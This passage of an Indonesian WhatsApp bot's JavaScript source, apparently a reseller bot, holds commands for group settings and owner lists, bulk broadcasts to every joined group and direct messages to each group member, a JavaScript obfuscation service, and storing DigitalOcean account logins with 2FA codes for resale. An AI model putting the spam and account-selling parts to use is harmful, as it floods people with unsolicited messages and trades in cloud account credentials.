await premium.splice(posi, 1)
await fs.writeFileSync("./data/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus grup reseller panel ✅`)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "listakses": {
if (!isOwner) return m.reply(msg.owner)
if (premium.length < 1) return m.reply("Tidak ada grup reseller panel")
const datagc = await sock.groupFetchAllParticipating()
let teks = ""
for (let i of premium) {
let nama = datagc[i].subject || "Grup tidak ditemukan"
teks += `\n* ${i}
* ${nama}\n`
}
return m.reply(teks)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "welcome": case "welcom": {
if (!isOwner) return m.reply(msg.owner)
if (!m.isGroup) return m.reply(msg.group)
if (!text || !/on|off/.test(text)) return example("on/off")
const input = text.toLowerCase()
if (/on/.test(input)) {
if (welcome.includes(m.chat)) return m.reply(`Welcome di grup ini sudah aktif!`)
welcome.push(m.chat)
await fs.writeFileSync("./data/welcome.json", JSON.stringify(welcome, null, 2))
return m.reply(`Berhasil menghidupkan Welcome di grup ini ✅`)
} 
if (/off/.test(input)) {
if (!welcome.includes(m.chat)) return m.reply(`Welcome di grup ini sudah tidak aktif!`)
let posi = welcome.indexOf(m.chat)
await welcome.splice(posi, 1)
await fs.writeFileSync("./data/welcome.json", JSON.stringify(welcome, null, 2))
return m.reply(`Berhasil mematikan welcome di grup ini ✅`)
}
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "autoread": case "autoreadsw": case "anticall": case "autotyping": case "autorecording": {
if (!isOwner) return m.reply(msg.owner)
const getStatus = () => {
let teks = ""
for (let i of Object.keys(setbot)) {
teks += `* *${func.capital(i)} :* ${setbot[i] ? "aktif ✅" : "tidak aktif ❌"}
`
}
return teks
}
if (!text || !/on|off/.test(text)) return m.reply(`\nContoh : *${cmd}* on/off\n\n${getStatus()}`)
const input = text.toLowerCase()
if (/on/.test(input)) {
if (setbot[command.toLowerCase()] == true) return m.reply(`*${func.capital(command)}* sudah aktif!`)
if (command == "autotyping" && setbot.autorecording == true) setbot.autorecording = false
if (command == "autorecording" && setbot.autotyping == true) setbot.autotyping = false
setbot[command.toLowerCase()] = true
await fs.writeFileSync("./data/bot.json", JSON.stringify(setbot, null, 2))
return m.reply(`
Berhasil menyalakan *${func.capital(command)}* ✅

${getStatus()}`)
} 
if (/off/.test(input)) {
if (setbot[command.toLowerCase()] == false) return m.reply(`${func.capital(command)} sudah tidak aktif!`)
setbot[command.toLowerCase()] = false
await fs.writeFileSync("./data/bot.json", JSON.stringify(setbot, null, 2))
return m.reply(`
Berhasil mematikan *${func.capital(command)}* ✅

${getStatus()}`)
}
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "bljpm": case "blgcjpm": {
if (!isOwner) return m.reply(msg.owner)
if (!m.isGroup) return m.reply(msg.group)
if (!text || !/on|off/.test(text)) return example("on/off")
const input = text.toLowerCase()
if (/on/.test(input)) {
if (bljpm.includes(m.chat)) return m.reply(`Blacklist jpm di grup ini sudah aktif!`)
bljpm.push(m.chat)
await fs.writeFileSync("./data/bljpm.json", JSON.stringify(bljpm, null, 2))
return m.reply(`Berhasil menghidupkan blacklist jpm di grup ini ✅`)
} 
if (/off/.test(input)) {
if (!bljpm.includes(m.chat)) return m.reply(`Blacklist jpm di grup ini sudah tidak aktif!`)
let posi = bljpm.indexOf(m.chat)
await bljpm.splice(posi, 1)
await fs.writeFileSync("./data/bljpm.json", JSON.stringify(bljpm, null, 2))
return m.reply(`Berhasil mematikan blacklist jpm di grup ini ✅`)
}
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "idgc": {
if (!m.isGroup) return m.reply(msg.group)
return m.reply(m.chat)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "leave": {
if (!isOwner) return m.reply(msg.owner)
if (!m.isGroup) return m.reply(msg.group)
await func.sleep(4000)
await sock.groupLeave(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetlinkgc": case "resetlink": {
if (!isOwner) return m.reply(msg.owner)
if (!m.isGroup) return m.reply(msg.group)
if (!m.isBotAdmin) return m.reply(msg.botadmin)
await sock.groupRevokeInvite(m.chat)
m.reply("Sukses mereset ling grup ini ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "readqr": {
if (!/image/.test(mime)) return example("dengan reply qris")
const Jimp = require("jimp");
const QrCode = require("qrcode-reader");
async function readQRISFromBuffer(buffer) {
    return new Promise(async (resolve, reject) => {
        try {
            const image = await Jimp.read(buffer);
            const qr = new QrCode();
            qr.callback = (err, value) => {
                if (err) return reject(err);
                resolve(value ? value.result : null);
            };
            qr.decode(image.bitmap);
        } catch (error) {
            return m.reply("error : " + error)
        }
    });
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await readQRISFromBuffer(aa)
await sock.sendMessage(m.chat, {text: `${dd}`}, {quoted: m})
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "enchard": case "encrypthard": {
if (!/javascript/g.test(mime)) return example("dengan kirim file .js")
let media = m.quoted ? await m.quoted.download() : await m.download()
let filename = m.quoted ? m.quoted.fakeObj.message.documentMessage.fileName : m.fakeObj.message.documentMessage.fileName
await m.reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(media.toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = `素晴座素晴Skyzopedia`

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}`, obfuscated.code)
  await sock.sendMessage(m.chat, {document: await fs.readFileSync(`./@hardenc${filename}`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
await fs.unlinkSync(`./@hardenc${filename}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getcase": {
if (!isOwner) return
if (!text) return example("menu")
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./skyzo.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pushkontak2": {
if (!isOwner) return m.reply(msg.owner)
if (!m.isGroup) return m.reply(msg.group)
if (!text) return example("pesannya")
const teks = text
const jidawal = m.chat
const data = await sock.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses pushkontak ke *${halls.length}* member grup`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await sock.sendMessage(mem, {text: teks}, {quoted: qtext})
await func.sleep(4000)
}}

await sock.sendMessage(jidawal, {text: `*Pushkontak Berhasil ✅*\nTotal member : ${halls.length}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pushkontak": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return example("pesannya")
const meta = await sock.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textpushkontak = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.respushkontak ${i}`, 
description: `${meta[i].participants.length} Member`
})
}
return sock.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Target Grup Pushkontak\n",
  contextInfo: {
   mentionedJid: [m.sender], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "respushkontak": {
if (!isOwner) return 
if (!text) return 
if (!global.textpushkontak) return
const idgc = text
const teks = global.textpushkontak
const jidawal = m.chat
const data = await sock.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await sock.sendMessage(mem, {text: teks}, {quoted: qtext})
await func.sleep(4000)
}}

delete global.textpushkontak
await sock.sendMessage(jidawal, {text: `*Pushkontak Berhasil ✅*\nTotal member : ${halls.length}`}, {quoted: m})
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "addown": case "addowner": {
if (!isOwner) return m.reply(msg.owner)
if (!text && !m.quoted) return example("6285XX atau @tag")
let input = m.quoted ? m.quoted.sender : m.mentionedJid ? m.mentionedJid[0] : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
if (!input) return example("6285XX atau @tag")
if (ownplus.includes(input)) return m.reply(`Nomor ${input.split("@")[0]} sudah terdaftar sebagai owner!`)
if (input == botNumber) return m.reply(`Nomor ${input.split("@")[0]} sudah terdaftar sebagai owner!`)
if (input.split("@")[0] == global.owner) return m.reply(`Nomor ${input.split("@")[0]} sudah terdaftar sebagai owner!`)
await ownplus.push(input)
await fs.writeFileSync("./data/owner.json", JSON.stringify(ownplus, null, 2))
return m.reply(`Sukses menjadikan ${input.split("@")[0]} sebagai *owner*`)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "delown": case "delowner": {
if (!isOwner) return m.reply(msg.owner)
if (!text && !m.quoted) return example("6285XX atau @tag")
if (text == "all") {
ownplus.length = 0
await fs.writeFileSync("./data/owner.json", JSON.stringify(ownplus, null, 2))
return m.reply("Berhasil menghapus semua owner ✅")
}
let input = m.quoted ? m.quoted.sender : m.mentionedJid ? m.mentionedJid[0] : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
if (!input) return example("6285XX atau @tag")
if (!ownplus.includes(input)) return m.reply(`Nomor ${input.split("@")[0]} tidak terdaftar sebagai owner!`)
if (input == botNumber) return m.reply(`Nomor ${input.split("@")[0]} tidak terdaftar sebagai owner!`)
if (input.split("@")[0] == global.owner) return m.reply(`Nomor ${input.split("@")[0]} tidak terdaftar sebagai owner!`)
const posi = ownplus.indexOf(input)
await ownplus.splice(posi, 1)
await fs.writeFileSync("./data/owner.json", JSON.stringify(ownplus, null, 2))
return m.reply(`Sukses menghapus ${input.split("@")[0]} sebagai *owner*`)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "delppbot": case "delpp": {
if (!isOwner) return m.reply(msg.owner)
await sock.removeProfilePicture(botNumber)
m.reply("Berhasil menghapus profile bot ✅")
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "unblok": {
if (!isOwner) return
if (m.isGroup && !m.quoted && !text) return example("@tag/nomornya")
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await sock.updateBlockStatus(mem, "unblock");
if (m.isGroup) sock.sendMessage(m.chat, {text: `Berhasil membuka blokiran @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "block": case "blok": {
if (!isOwner) return
if (m.isGroup && !m.quoted && !text) return example("@tag/nomornya")
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await sock.updateBlockStatus(mem, "block")
if (m.isGroup) sock.sendMessage(m.chat, {text: `Berhasil memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "boost": case "delsampah": {
if (!isOwner) return m.reply(msg.owner)
let sampah = await fs.readdirSync('./server/tmp').filter(e => e !== "akses.txt")
if (sampah.length < 1) return m.reply("Tidak ada sampah")
const total = sampah.length
sampah.forEach((i) => {
fs.unlinkSync('./server/tmp/' + i)
})
m.reply(`Berhasil membersihkan ${total} sampah tmp`)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "setppbot": case "setpp": {
if (!isOwner) return m.reply(msg.owner)
if (!/image/.test(mime)) return example("dengan mengirim foto")
const { S_WHATSAPP_NET } = require("baileys");

const buffer = await sock.downloadAndSaveMediaMessage(qmsg)
var { img } = await func.generateProfilePicture(buffer)
await sock.query({
tag: 'iq',
attrs: {
to: S_WHATSAPP_NET,
type: 'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
m.reply("Berhasil mengganti profile bot ✅")
fs.unlinkSync(buffer)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "joinch": case "joinchannel": {
if (!isOwner) return m.reply(msg.owner)
if (!text && !m.quoted) return example("linkchnya")
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await sock.newsletterMetadata("invite", result)
await sock.newsletterFollow(res.id)
m.reply(`*Berhasil join channel whatsapp ✅*

* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*`)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "reactch": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return example("linkpesan 😂")
if (!args[0] || !args[1]) return example("linkpesan 😂")
if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = args[0].split('/')[4]
let serverId = args[0].split('/')[5]
let res = await sock.newsletterMetadata("invite", result)
await sock.newsletterReactMessage(res.id, serverId, args[1])
m.reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "cekidch": case "idch": {
if (!text) return example("linkchnya")
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await sock.newsletterMetadata("invite", result)
let teks = `${res.id}

* ${res.name}
* ${res.subscribers} Pengikut`
return m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sendtesti": case "testi": case "uptesti": case "jpmtesti": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return example("teks dengan mengirim foto")
if (!/image/.test(mime)) return example("teks dengan mengirim foto")
const allgrup = await sock.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await sock.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses jpm testimoni ke dalam saluran & ${res.length} grup chat`)
try {
await sock.sendMessage(global.idsaluran, {image: await fs.readFileSync(rest), caption: teks})
} catch {}
for (let i of res) {
if (bljpm.includes(i)) continue
try {
await sock.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: {
isForwarded: true, mentionedJid: [m.sender], 
forwardedNewsletterMessageInfo: {
newsletterJid: global.idsaluran, newsletterName: global.namasaluran
}}}, {quoted: m})
count += 1
} catch {}
await func.sleep(4000)
}
await fs.unlinkSync(rest)
await sock.sendMessage(jid, {text: `Testimoni berhasil dikirim ke dalam channel & ${count} grup`}, {quoted: m})
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "jpm": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return example("teksnya & foto (opsional)")
let rest
if (/image/.test(mime)) {
rest = await sock.downloadAndSaveMediaMessage(qmsg)
}
const allgrup = await sock.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const ttks = text
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const jid = m.chat
await m.reply(`Memproses ${rest !== undefined ? "jpm teks & foto" : "jpm teks"} ke ${res.length} grup chat`)

for (let i of res) {
if (bljpm.includes(i)) continue
try {
await sock.sendMessage(i, pesancoy, {quoted: qtext})
count += 1
} catch {}
await func.sleep(8000)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await sock.sendMessage(jid, {text: `Jpm ${rest !== undefined ? "teks & foto" : "teks"} berhasil dikirim ke ${count} grup`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmht": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return example("teksnya & foto (opsional)")
let rest
if (/image/.test(mime)) {
rest = await sock.downloadAndSaveMediaMessage(qmsg)
}
const allgrup = await sock.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const ttks = text
const opsijpm = rest !== undefined ? "teks & foto ht" : "teks ht"
const jid = m.chat
await m.reply(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
let ments = allgrup[i].participants.map(e => e.id)
let pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks, mentions: ments } : { text: ttks, mentions: ments }
await sock.sendMessage(i, pesancoy, {quoted: qtext})
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await sock.sendMessage(jid, {text: `Jpm *${opsijpm}* berhasil dikirim ke ${count} grup chat`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmch": {
if (!isOwner) return m.reply(msg.owner)
if (channel.length < 1) return m.reply("Tidak ada id ch didalam database idch")
if (!text) return example("teksnya & foto (opsional)")
let rest
if (/image/.test(mime)) {
rest = await sock.downloadAndSaveMediaMessage(qmsg)
}
const res = channel
let count = 0
const ttks = text
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const jid = m.chat
await m.reply(`Memproses ${rest !== undefined ? "jpm teks & foto" : "jpm teks"} ke ${res.length} Channel WhatsApp`)

for (let i of res) {
try {
await sock.sendMessage(i, pesancoy)
count += 1
} catch {}
await func.sleep(8000)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await sock.sendMessage(jid, {text: `Jpm ${rest !== undefined ? "teks & foto" : "teks"} berhasil dikirim ke ${count} Channel WhatsApp`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addidch":
case "addid": {
    if (!isOwner) return m.reply(msg.owner)
    let ids
    if (text.includes("https://whatsapp.com/channel")) {
    let result = text.split('https://whatsapp.com/channel/')[1]
    let res = await sock.newsletterMetadata("invite", result)
    ids = [res.id]
    } else if (text.includes("@newsletter")) {
    ids = text.split(",").map(i => i.trim()) 
    if (ids.some(id => !id.endsWith("@newsletter"))) {
        return example("idch1,idch2 (bisa berapapun)")
    }
    } else {
    return example("idch1, idch2 (bisa berapapun) bisa pake linkchnya juga)")
    }

    let newIds = ids.filter(id => !channel.includes(id)) // Hindari duplikasi

    if (newIds.length === 0) {
        return m.reply("Semua ID yang dimasukkan sudah ada dalam daftar ❌")
    }

    channel.push(...newIds) // Tambahkan ID baru

    try {
        await fs.writeFileSync("./data/channel.json", JSON.stringify(channel, null, 2))
        m.reply(`Berhasil menambah ${newIds.length} ID channel ✅`)
    } catch (err) {
        console.error("Error menyimpan file:", err)
        m.reply("Terjadi kesalahan saat menyimpan data ❌")
    }
    }
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listidch": case "listid": {
if (channel.length < 1) return m.reply("Tidak ada id ch didalam database idch")
let teks = `\n *Total ID Channel :* ${channel.length}\n`
for (let i of channel) {
let res = await sock.newsletterMetadata("jid", i)
teks += `\n* ${i}
* ${res.name}\n`
}
sock.sendMessage(m.chat, {text: teks, mentions: []}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delidch": case "delid": {
if (!isOwner) return m.reply(msg.owner)
if (channel.length < 1) return m.reply("Tidak ada id ch didalam database idch")
if (!text) return example("idchnya")
let input = text
if (text == "all") {
channel.length = 0
await fs.writeFileSync("./data/channel.json", JSON.stringify(channel, null, 2))
return m.reply(`Berhasil menghapus semua ID Channel ✅`)
}
if (!channel.includes(input)) return m.reply(`ID Channel tidak ditemukan!`)
let posi = channel.indexOf(input)
await channel.splice(posi, 1)
await fs.writeFileSync("./data/channel.json", JSON.stringify(channel, null, 2))
m.reply(`Berhasil menghapus ID Channel ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "subdo": case "subdomain": case "domain": {
if (!isOwner) return m.reply(msg.owner)
if (!text) {
const obj = Object.keys(domains)
let count = 0
let teks = `\n`
for (let i of obj) {
count++
teks += `* ${count}. ${i}\n`
}
teks += `\n Contoh Penggunaan :\n *.domain* 2 host|ipvps\n`
return m.reply(teks)
}
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(domains)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${domains[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + domains[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
let teks = `*Berhasil membuat subdomain ✅*\n\n*🚀 IP Address :* ${ip}\n`
const domnode = `node${func.getRandom("")}.${host}`
for (let i = 0; i < 2; i++) {
await subDomain1(i == 0 ? host.toLowerCase() : domnode, ip).then(async (e) => {
if (e['success']) {
teks += `*🌐 ${e['name']}*\n`
} else {
return m.reply(`${e['error']}`)
}
}).catch (err => m.reply("Error: " + err))
}
await m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "adddomain": case "adddom": {
if (!isOwner) return m.reply(msg.owner)
let [dom, zone, api] = text.split("|")
if (!dom || !zone || !api) return example("domain|zoneid|apitoken")
dom = dom.toLowerCase()
if (domains[dom]) return m.reply(`Domain ${dom} sudah terdaftar di dalam database subdomain`)
domains[dom] = {
zone: zone, 
apitoken: api
}
await fs.writeFileSync("./data/domain.json", JSON.stringify(domains, null, 2))
m.reply(`Berhasil menambahkan domain ${dom} ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deldomain": case "deldom": {
if (!isOwner) return m.reply(msg.owner)
if (Object.keys(domains).length < 1) return m.reply("Tidak ada domain di dalam database subdomain")
let dom = text.toLowerCase()
if (dom == "all") {
domains = {}
await fs.writeFileSync("./data/domain.json", JSON.stringify(domains, null, 2))
return m.reply(`Berhasil menghapus semua domain ✅`)
}
if (!domains[dom]) return m.reply(`Domain ${dom} tidak terdaftar di dalam database subdomain`)
delete domains[dom]
await fs.writeFileSync("./data/domain.json", JSON.stringify(domains, null, 2))
m.reply(`Berhasil menghapus domain ${dom} ✅`)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "listdomain": case "listdom": {
if (!isOwner) return m.reply(msg.owner)
if (Object.keys(domains).length < 1) return m.reply("Tidak ada domain di database subdomain")
let teks = "\n"
for (let i of Object.keys(domains)) {
teks += `* ${i}\n`
}
teks += `\n Contoh Penggunaan :\n *.domain* 2 host|ipvps\n`
return m.reply(teks)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "addscript": case "addsc": {
if (!isOwner) return m.reply(msg.owner)
if (!text || !m.quoted) return example("namasc|harga(contoh 30000) dengan reply scriptnya")
if (!/zip/.test(mime)) return example("namasc|harga(contoh 30000) dengan reply scriptnya")
let [namasc, harga] = text.split("|")
if (!namasc || !harga || isNaN(harga)) return example("namasc|harga(contoh 30000) dengan reply scriptnya")
harga = Number(harga)
script.push({
nama: namasc, 
path: "./data/script/" + namasc + '.zip', 
harga: harga.toString()
})
await fs.writeFileSync("./data/script.json", JSON.stringify(script, null, 2))
let ff = await m.quoted.download()
await fs.writeFileSync("./data/script/"+namasc+".zip", ff)
return m.reply(`Berhasil menambah script *${namasc}*`)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "listscript": case "listsc": {
if (!isOwner) return m.reply(msg.owner)
if (script.length < 1) return m.reply("Tidak ada Script Bot.")
let teks = ""
let id = 0
for (let i of script) {
id += 1
teks += `
* *ID :* ${id}
* *Nama :* ${i.nama}
* *Harga :* Rp${func.toRupiah(i.harga)}
`
}
return m.reply(teks)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "delscript": case "delsc": {
if (!isOwner) return m.reply(msg.owner)
if (script.length < 1) return m.reply("Tidak ada Script Bot.")
if (text === "all") {
await fs.readdirSync("./data/script").filter(i => i !== "akses.txt").forEach(async (path) => {
try {
await fs.unlinkSync("./data/script/"+path)
} catch {}
})
script.length = 0; 
await fs.writeFileSync("./data/script.json", JSON.stringify(script, null, 2))
return m.reply(`Berhasil menghapus semua Script ✅`);
}
if (!text || isNaN(text)) return example("idscript")
let number = Number(text)
if (number > script.length) return m.reply("ID Script tidak ditemukan.")
let sc = script[number - 1]
const namasc = sc.nama
try {
await fs.unlinkSync(sc.path)
} catch {}
script.splice((number - 1), 1)
await fs.writeFileSync("./data/script.json", JSON.stringify(script, null, 2))
return m.reply(`Berhasil menghapus script *${namasc}*`)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "getscript": case "getsc": {
if (!isOwner) return m.reply(msg.owner)
if (script.length < 1) return m.reply("Tidak ada Script Bot.")
if (!text || isNaN(text)) return example("idscript")
let number = Number(text)
if (number > script.length) return m.reply("ID Script tidak ditemukan.")
let sc = script[number - 1]
await sock.sendMessage(m.chat, {document: await fs.readFileSync(sc.path), mimetype: "application/zip", fileName: sc.nama+".zip"}, {quoted: m})
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "adddo":
case "addstokdo": {
    if (!isOwner) return m.reply(msg.owner)
    if (!text) return example("skyzo@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)")
    
    const cek = text.split("|");
    if (cek.length !== 6) return example("skyzo@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)")

    let [email, pw, kode2fa, reff, droplet, harga] = cek;
    
    if (isNaN(harga)) return m.reply("Harga harus berupa angka!");

    stokdo.push({
        email: email.trim(), 
        password: pw.trim(), 
        kode2fa: kode2fa.trim(), 
        referall: reff.trim(), 
        droplet: droplet.trim(), 
        harga: Number(harga.trim())
    });

    await fs.writeFileSync("./data/stokdo.json", JSON.stringify(stokdo, null, 2));
    await m.reply("Berhasil menambah data stok digitalocean ✅");
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delstokdo":
case "deldo": {
    if (!isOwner) return m.reply(msg.owner)
    if (stokdo.length < 1) return m.reply("Tidak ada stok digitalocean.");


    if (text === "all") {
        stokdo.length = 0; // Menghapus semua data
        await fs.writeFileSync("./data/stokdo.json", JSON.stringify(stokdo, null, 2));
        return m.reply(`Berhasil menghapus semua stok data akun DigitalOcean ✅`);
    }

    if (!text || isNaN(text)) return example("ID Stok yang ingin dihapus\n\nKetik *.liststok* untuk melihat daftar stok.")
    
    let inx = Number(text) - 1;
    if (inx < 0 || inx >= stokdo.length) return m.reply("ID stok tidak ditemukan.");

    stokdo.splice(inx, 1);
    await fs.writeFileSync("./data/stokdo.json", JSON.stringify(stokdo, null, 2));
    await m.reply("Berhasil menghapus data stok DigitalOcean ✅");
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "liststokdo":
case "listdo": {
    if (!isOwner) return m.reply(msg.owner)
    if (m.isGroup) return m.reply(msg.private)
